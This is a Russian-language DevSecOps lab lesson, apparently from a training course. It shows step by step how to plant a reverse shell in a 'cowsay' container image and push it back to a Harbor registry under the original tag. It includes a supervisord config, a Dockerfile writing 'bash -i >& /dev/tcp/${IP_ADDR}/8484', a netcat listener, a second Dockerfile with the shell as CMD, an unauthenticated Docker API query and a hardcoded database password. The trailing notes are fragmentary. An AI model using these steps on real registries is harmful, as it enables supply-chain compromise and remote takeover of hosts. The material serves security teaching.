Выполним `docker login` для входа в реестр Harbor. Username и CLI-секрет возьмём из прошлого урока — в профиле пользователя Harbor.

```shell
 export HARBOR_HOST=harbor.devsecops.education-services.ru
 docker login $HARBOR_HOST
# Вводим свои Username и CLI-secret
# Можно зайти в Harbor (harbor.devsecops.education-services.ru) и посмотреть в своём профиле
```

Скачаем образ `cowsay` из реестра Harbor и создадим новый Dockerfile:

```shell
 # Имя репозитория из прошлого урока; можно зайти в Harbor (harbor.devsecops.education-services.ru) и посмотреть свой проект
 export REPO=myrepo_<ID учетки>
 docker pull $HARBOR_HOST/$REPO/cowsay:0.0.1
 # Убедитесь, что тег образа правильный
```

Определим расположение `cowsay` в образе с помощью команды `history`:

```shell
 export COWSAY_IMAGE=$HARBOR_HOST/$REPO/cowsay:0.0.1
 docker history --no-trunc --format json $COWSAY_IMAGE | jq -r 'select(.CreatedBy | test("WORKDIR|jar")) | .CreatedBy'
```

```shell
 mkdir cowsay-reverse-shell
 cd cowsay-reverse-shell
 docker create --name cowsay $COWSAY_IMAGE
 # скопируем файл cowsay.jar из контейнера на хост
 docker cp cowsay:/app/cowsay.jar .
```

```shell
 export IP_ADDR=$(curl 2ip.ru)
 echo $IP_ADDR
```
Создадим файл конфигурации `supervisord.conf` для управления процессами:

```shell
cat > supervisord.conf <<EOF
[supervisord]
nodaemon=true

[program:app]
command=java -jar /app/cowsay.jar
autorestart=true
stopasgroup=true
killasgroup=true
stdout_logfile=/dev/fd/1
stderr_logfile=/dev/fd/2
stdout_logfile_maxbytes=0
stderr_logfile_maxbytes=0

[program:reverse-shell]
command=/app/reverse.sh
autorestart=true
stopasgroup=true
killasgroup=true
stdout_logfile=/dev/fd/1
stderr_logfile=/dev/fd/2
stdout_logfile_maxbytes=0
stderr_logfile_maxbytes=0
EOF
```

Создадим файл-шаблон `Dockerfile.template` для внедрения `reverse shell` в образ `cowsay`. В файле оставим плейсхолдеры для переменных окружения, которые мы заменим при сборке образа.

```shell
 nano Dockerfile.template
```

```dockerfile
FROM ${COWSAY_IMAGE}
WORKDIR /app
RUN apt-get update && apt-get install -y supervisor && rm -rf /var/lib/apt/lists/*
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
COPY cowsay.jar /app/cowsay.jar
RUN echo '#!/bin/bash\nbash -i >& /dev/tcp/${IP_ADDR}/8484 0>&1' > /app/reverse.sh && \
    chmod +x /app/reverse.sh 
ENTRYPOINT ["supervisord","-n","-c","/etc/supervisor/conf.d/supervisord.conf"]
```

Воспользуемся `envsubst` и заменим переменные в шаблоне на текущие переменные окружения:

```shell
 envsubst < Dockerfile.template > Dockerfile
```

Убедимся, что Dockerfile создан правильно:

```shell
 cat Dockerfile
 ```

Теперь мы можем собрать новый образ с помощью команды `docker build` и прокинуть в него IP-адрес хоста:

```shell
 docker build --no-cache -t $HARBOR_HOST/$REPO/cowsay:0.0.1 .
```

```shell
 nc -lvnp 8484
```

Обычно `netcat` входит в основной набор утилит Kali Linux. Если по какой-то причине `netcat` отсутствует, его можно установить с помощью такой команды:

```shell
 sudo apt update
 sudo apt install netcat-openbsd
```

Откроем ещё один терминал хоста `hack` с `kali`:

```shell
 ssh -J debian@<jumpbox IP> kali@<hack IP>
```

В новом терминале запустим контейнер с новым образом:

```shell
 export HARBOR_HOST=harbor.devsecops.education-services.ru
 export REPO=myrepo_<ID учетки>
 export COWSAY_IMAGE=$HARBOR_HOST/$REPO/cowsay:0.0.1
 docker run -d --name cowsay-reverse $COWSAY_IMAGE
``` 

![](https://pictures.s3.yandex.net/resources/test_reverse_shell_1762783676.png)

Запушим новый образ с `reverse shell` в реестр Harbor:

```shell
 docker push $HARBOR_HOST/$REPO/cowsay:0.0.1
```

```shell
 pkill nc
 nc -lvnp 8484
```

Для чистоты эксперимента удалим все контейнеры и образы:

```shell
 docker rm -f $(docker ps -qa)
 docker rmi -f $(docker images -aq)
```

Cоздадим `docker-compose.yml`:

```yaml
version: "3.8"
services:
  postgres:
    image: postgres:16
    container_name: cowsay-postgres
    environment:
      POSTGRES_DB: cowsay
      POSTGRES_USER: cowsay
      POSTGRES_PASSWORD: supersecret
    ports:
      - "5432:5432"
    volumes:
      - cowsay-pgdata:/var/lib/postgresql/data
  app:
    image: harbor.devsecops.education-services.ru/myrepo_s17025741/cowsay:0.0.1
    container_name: cowsay-app
    depends_on:
      - postgres
    ports:
      - "8080:8080"
    environment:
      # These are optional since application.properties already contains them,
      # but they allow easy override via compose
      SPRING_DATASOURCE_URL: jdbc:postgresql://postgres:5432/cowsay
      SPRING_DATASOURCE_USERNAME: cowsay
      SPRING_DATASOURCE_PASSWORD: supersecret
volumes:
  cowsay-pgdata:
```

Проверим, что приложение работает:

```shell
 docker compose ps
 curl http://localhost:8080/hello
```


---



```shell
docker run -d --name registry -p 80:5000 --restart=always registry:2.7.1
git clone https://github.com/sabbath666/DockerSecurity.git
docker build -t cowsay:0.0.1 .

```

```shell
curl 2ip.ru
curl -X GET http://127.0.0.1:2375/containers/json?all=true
```

```shell
docker pull
export IP_ADDR=$(ifconfig eth0 | awk 'NR==2 {print $2}')

cat > Dockerfile <<EOF
FROM maven:3.9.6-eclipse-temurin-21 AS build
WORKDIR /build
COPY pom.xml .
COPY src ./src
RUN mvn clean package -DskipTests

FROM eclipse-temurin:21-jre
ARG IP
ENV IP=${IP}
WORKDIR /app
COPY --from=build /build/target/cowsay-0.0.1.jar cowsay.jar
RUN mkdir data
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/${IP}/8484 0>&1"]
# ENTRYPOINT ["java", "-jar", "cowsay.jar"]
EOF

docker build
docker push
apt install netcat -y
nc -lvnp 8484
```

```shell
docker pull
docker run
```


